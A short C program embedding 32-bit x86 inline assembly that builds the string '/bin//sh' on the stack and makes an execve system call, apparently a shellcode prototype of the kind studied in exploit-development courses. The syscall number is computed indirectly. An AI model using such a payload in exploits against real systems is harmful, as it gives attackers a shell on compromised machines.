#include<stdio.h>

int main() 
{
    __asm__(
        "xorl %eax, %eax\t\n"
        "xorl %ebx, %ebx\t\n"
        "pushl %eax\t\n"
        "pushl $0x68732f2f\t\n"
        "pushl $0x6e69622f\t\n"
        "movl %esp, %ebx\t\n"
        "pushl %eax\t\n"
        "pushl %ebx\t\n"
        "movl %esp, %ecx\t\n"
        "movb $17, %al\t\n"
        "addb $-6, %al\t\n"
        "xorl %edx, %edx\t\n"
        "int  $0x80\t\n"
        "movl $1, %eax\t\n"
        "xorl %ebx, %ebx\t\n"
        "int  $0x80\t\n"
    );
    return 0; 
}

